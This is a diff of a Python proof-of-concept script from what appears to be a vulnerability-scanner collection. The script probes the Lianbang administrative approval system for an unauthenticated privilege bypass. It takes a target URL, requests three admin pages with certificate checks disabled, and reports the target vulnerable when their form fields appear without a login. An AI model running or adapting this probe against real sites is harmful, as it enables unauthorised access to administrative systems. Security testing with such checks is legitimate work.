@@ -11,34 +11,27 @@ description: 1./workplate/xzsp/kqgl/kqsz/kqsz.aspx（无需登陆直接对系统
 import sys
 import requests
 import warnings
-
-  
-
-class lianbang_multi_bypass_priv:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['连邦行政审批系统越权漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/workplate/xzsp/kqgl/kqsz/kqsz.aspx"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"tbPmSignOff" in req.text:
                 result[2]=  '存在'
                 result[1] = vulnurl
 
-            vulnurl = self.url + "/workplate/xzsp/lbsxdict/add.aspx"
+            vulnurl = url + "/workplate/xzsp/lbsxdict/add.aspx"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"xksxid" in req.text:
                 result[2]=  '存在'
                 result[1] = vulnurl
                 return result
 
-            vulnurl = self.url + "/workplate/base/operation/add.aspx"
+            vulnurl = url + "/workplate/base/operation/add.aspx"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"tbDescr" in req.text:
                 result[2]=  '存在'
@@ -54,5 +47,5 @@ class lianbang_multi_bypass_priv:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = lianbang_multi_bypass_priv(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
